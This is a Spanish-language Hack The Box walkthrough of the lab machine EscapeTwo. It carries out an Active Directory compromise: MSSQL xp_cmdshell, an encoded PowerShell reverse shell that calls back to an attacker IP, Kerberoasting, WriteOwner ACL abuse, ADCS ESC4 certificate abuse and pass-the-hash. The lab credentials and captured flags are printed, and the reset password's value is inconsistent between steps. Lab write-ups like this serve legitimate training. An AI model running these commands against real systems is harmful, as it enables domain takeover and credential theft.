# Máquina: EscapeTwo

- **Sistema Operativo:** Windows
- **Dificultad:** Fácil
- **Técnicas clave:** Active Directory, MSSQL Explotation, Ticket Granting, PrivEsc

---


![Pasted image 20260918184848.png](assets/Pasted%20image%2020260918184848.png)

Como es común en las pruebas de penetración de Windows de la vida real, iniciará este cuadro con las credenciales para la siguiente cuenta: rose / KxEPkKe6R8su

fase uno reconocimiento

```
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.71.125 -oN escaneo
```

```
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-18 18:57:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-09-18T18:58:42+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-18T18:58:42+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.71.125:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-09-18T18:58:42+00:00; 0s from scanner time.
| ms-sql-info:
|   10.129.71.125:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-18T18:49:29
|_Not valid after:  2056-09-18T18:49:29
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-18T18:58:42+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-09-18T18:58:42+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-18T18:58:25
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.79 seconds
```

al hacer el escaneo miramos que estamos en un posible dc asi que agregamos el dominio al etc/hosts

![Pasted image 20260918190437.png](assets/Pasted%20image%2020260918190437.png)

al listar los shares de nuestor user miramos lo siguiente

```
nxc smb 10.129.71.125 -u 'rose' -p 'KxEPkKe6R8su' --shares
```

![Pasted image 20260918190943.png](assets/Pasted%20image%2020260918190943.png)

asi que con smbclient nos conectamos

```
smbclient //10.129.71.125/Users -U rose%KxEPkKe6R8su
```

![Pasted image 20260918191015.png](assets/Pasted%20image%2020260918191015.png)

en default miramos esto

![Pasted image 20260918191302.png](assets/Pasted%20image%2020260918191302.png)

nada impotante pero tenemos otro recurso llamado Accounting Department asi que lo miramos

```
smbclient //10.129.71.125/'Accounting Department' -U rose%KxEPkKe6R8su
```

![Pasted image 20260918200654.png](assets/Pasted%20image%2020260918200654.png)

nos descargamos esto dos archivos  pero miramos que son .xlsx que es  esto

Un archivo **.xlsx** es el formato predeterminado para **Microsoft Excel** desde la versión 2007, basado en el estándar **Office Open XML** (OOXML).  A diferencia del antiguo formato binario .xls, estos archivos son en realidad **archivos ZIP comprimidos** que contienen múltiples archivos XML organizados en una estructura de directorios, lo que reduce su tamaño y mejora la seguridad. asi que le isimos unzip y enumeramos y sacamos estos usuarios

![Pasted image 20260918202556.png](assets/Pasted%20image%2020260918202556.png)

```
angela
oscar
kevin
sa
```

tambien miamos esto

![Pasted image 20260918203011.png](assets/Pasted%20image%2020260918203011.png)

asi ya tenemos 5 user y dos pass asi que hay que probar tambien otra cosa la otra pass dise
mssql pas asi que podemos intentar por esa parte tambien con los user que tenemos

![Pasted image 20260918203414.png](assets/Pasted%20image%2020260918203414.png)

intentaremos por mssql y por smb

primero smb

```
nxc mssql 10.129.71.125 -u 'user.txt' -p 'pass.txt' --continue-on-success
```

![Pasted image 20260918203802.png](assets/Pasted%20image%2020260918203802.png)

por lo que miramos ninguno pero aora mssql

```
nxc mssql 10.129.71.125 -u user.txt -p pass.txt --no-bruteforce --local-auth --continue-on-success
```

![Pasted image 20260918203900.png](assets/Pasted%20image%2020260918203900.png)

miramos esto sa:MSSQLP@ssw0rd! le funciona la pass asi que nos conectamos

```
mssqlclient.py sa:MSSQLP@ssw0rd!@10.129.71.125
```

![Pasted image 20260918204443.png](assets/Pasted%20image%2020260918204443.png)

una bes adentro activamos xp_cmdshell

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

![Pasted image 20260918204649.png](assets/Pasted%20image%2020260918204649.png)

agamos rce para tener mas control

primero reverse shell agamos el archivo

![Pasted image 20260918211350.png](assets/Pasted%20image%2020260918211350.png)

ya luego ponemos esto en mssql

```
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADAAIgAsADkAMAA5ADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
```

![Pasted image 20260918211900.png](assets/Pasted%20image%2020260918211900.png)

ya  tenemos shell asi que miremos el blood

```
bloodhound-ce-python -u 'rose' -p 'KxEPkKe6R8su' -d sequel.htb -dc DC01.sequel.htb -ns 10.129.71.125 -c All --zip
```

![Pasted image 20260918215047.png](assets/Pasted%20image%2020260918215047.png)


nada importante aqui asi que al enumerar miramos esto

![Pasted image 20260918220056.png](assets/Pasted%20image%2020260918220056.png)

un directorio llamado SQL2019 al entrar miramos esto

![Pasted image 20260918220146.png](assets/Pasted%20image%2020260918220146.png)

se dejaron el archivoconfig de esto asi que miramos el sql-Configuration.INI

![Pasted image 20260918220300.png](assets/Pasted%20image%2020260918220300.png)

otra cuenta mas asi que la probamos

```
nxc smb 10.129.71.125 -u sql_svc -p 'WqSZAF6CysDQbGb3'
```

![Pasted image 20260918220343.png](assets/Pasted%20image%2020260918220343.png)

descargamos la confi del ad pero con este otro usuario para enumerar mas cosas

```
bloodhound-ce-python -u 'sql_svc' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -dc DC01.sequel.htb -ns 10.129.71.125 -c All --zip
```

pero este muestra lo mismo que lla tenemos

![Pasted image 20260918220956.png](assets/Pasted%20image%2020260918220956.png)

asi que lo que isimos fue un **Kerberoasting**, ahora que sí tenémos credenciales válidas de dominio (`sql_svc`):

```
GetUserSPNs.py sequel.htb/sql_svc:'WqSZAF6CysDQbGb3' -dc-ip 10.129.71.125 -request
```

![Pasted image 20260918221519.png](assets/Pasted%20image%2020260918221519.png)

eso lo intentamos pero nose rompio asi que intentamos probar todas las pass que tenemos con el asuario ryan y tiene la misma pass que sql_svc

![Pasted image 20260918222509.png](assets/Pasted%20image%2020260918222509.png)

ya con esto podemos sacar user

```
evil-winrm -i 10.129.71.125 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
```

![Pasted image 20260918222843.png](assets/Pasted%20image%2020260918222843.png)

```
431aca9cc9987d1144e11697102306e6
```

luego miramos que ryan tiene writeowner sobre CA_SVC con esta acl podemos cambiar la pass de ese usuario

![Pasted image 20260918223104.png](assets/Pasted%20image%2020260918223104.png)

sabiendo esto descargamos el powewiev en nuestro arch y lo pasamos a la maquina atacante

https://medium.com/@aslam.mahimkar/exploiting-ad-dacl-writeowner-misconfiguration-ca61fb2fcee1

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

luego lo cargamos

```
Import-Module .\PowerView.ps1
```

luegos nos damos owner

```
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
```

luego

```
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
```

luego **a `ryan`  sele pone una entrada de permiso (ACE) sobre el objeto `ca_svc` que le permita resetear su contraseña"**.

```
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
```

luego probamos el reset dela pass

```
$cred = ConvertTo-SecureString "Pepe123!" -AsPlainText -Force
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```

![Pasted image 20260918231105.png](assets/Pasted%20image%2020260918231105.png)

![Pasted image 20260918231210.png](assets/Pasted%20image%2020260918231210.png)

luego de esto enumeramos templetaes

```
certipy find -u 'ca_svc@sequel.htb' -p 'Pepe12345' -dc-ip 10.129.71.125 -stdout
```

![Pasted image 20260918231919.png](assets/Pasted%20image%2020260918231919.png)

lo que sospechamos es un esc4

![Pasted image 20260918232017.png](assets/Pasted%20image%2020260918232017.png)

https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/

luego abusamos

```
certipy template -u 'ca_svc@sequel.htb' -p 'Pepe12345' -template DunderMifflinAuthentication -write-default-configuration -dc-ip 10.129.71.125
```

![Pasted image 20260918232317.png](assets/Pasted%20image%2020260918232317.png)

nota importante en este punto la pass del objeto ca se cambia auto matica mente le recomiendos tirar todos los comandos rapido sin berificar antes de que se cambie

```
certipy find -u 'ca_svc@sequel.htb' -p 'Pepe12345' -dc-ip 10.129.71.125 -stdout
certipy template -u 'ca_svc@sequel.htb' -p 'Pepe12345' -template DunderMifflinAuthentication -write-default-configuration -dc-ip 10.129.71.125 -force
certipy req -username ca_svc@sequel.htb -p 'Pepe12345' -ca sequel-DC01-CA -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb -dc-ip 10.129.71.125 -ns 10.129.71.125
```

![Pasted image 20260918233914.png](assets/Pasted%20image%2020260918233914.png)

![Pasted image 20260918233942.png](assets/Pasted%20image%2020260918233942.png)

ya luego Pass-the-Hash

```
 evil-winrm -i 10.129.71.125 -u Administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

y sacamos root

```
a6ae3c6df77218642abc5bfad63f727b
```

![Pasted image 20260918235057.png](assets/Pasted%20image%2020260918235057.png)






